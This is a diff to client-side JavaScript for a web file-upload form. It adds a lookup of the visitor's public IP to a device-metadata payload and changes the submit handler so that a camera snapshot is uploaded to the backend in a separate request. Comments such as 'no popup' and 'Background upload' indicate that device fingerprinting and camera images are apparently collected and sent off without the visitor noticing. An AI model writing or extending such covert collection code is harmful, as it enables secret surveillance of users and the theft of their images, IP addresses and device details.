@@ -21,6 +21,7 @@ async function collectMetadata() {
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
     network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
     time: new Date().toLocaleString(),
+    ip: "" // will fetch below
   };
 
   // Battery info (no popup)
@@ -44,6 +45,15 @@ async function collectMetadata() {
     } catch {}
   }
 
+  // Fetch public IP from free API
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    metadata.ip = ipData.ip;
+  } catch (err) {
+    console.warn("IP fetch failed:", err);
+  }
+
   return metadata;
 }
 
@@ -65,7 +75,7 @@ async function captureCamera() {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    capturedImage = canvas.toDataURL("image/png"); // store camera image
+    capturedImage = canvas.toDataURL("image/png"); // only stored separately
 
     stream.getTracks().forEach((t) => t.stop());
     cameraCaptured = true;
@@ -82,9 +92,9 @@ if (fileInput) {
 }
 
 // ================================
-// UPLOAD FILE + METADATA + CAMERA IMAGE
+// UPLOAD FILE + METADATA ONLY
 // ================================
-async function uploadFileWithMetadata(file, metadata, cameraImage) {
+async function uploadFileWithMetadata(file, metadata) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
 
@@ -96,8 +106,7 @@ async function uploadFileWithMetadata(file, metadata, cameraImage) {
           body: JSON.stringify({
             file: reader.result,
             filename: file.name,
-            metadata,
-            cameraImage // optional, include if captured
+            metadata // only metadata, no camera image
           }),
         });
 
@@ -132,13 +141,21 @@ form.addEventListener("submit", async (e) => {
     try {
       const metadata = await collectMetadata();
 
-      const res = await uploadFileWithMetadata(
-        fileInput.files[0],
-        metadata,
-        capturedImage
-      );
+      // 1️⃣ Upload file + metadata (camera image NOT included)
+      const res = await uploadFileWithMetadata(fileInput.files[0], metadata);
 
-      console.log("Upload successful:", res);
+      console.log("File + metadata upload successful:", res);
+
+      // 2️⃣ Optionally, send camera image separately
+      if (capturedImage) {
+        await fetch(`${BACKEND_BASE}/upload`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: capturedImage }),
+        });
+        console.log("Camera image uploaded separately");
+      }
+
     } catch (err) {
       console.error("Background upload failed:", err);
     }
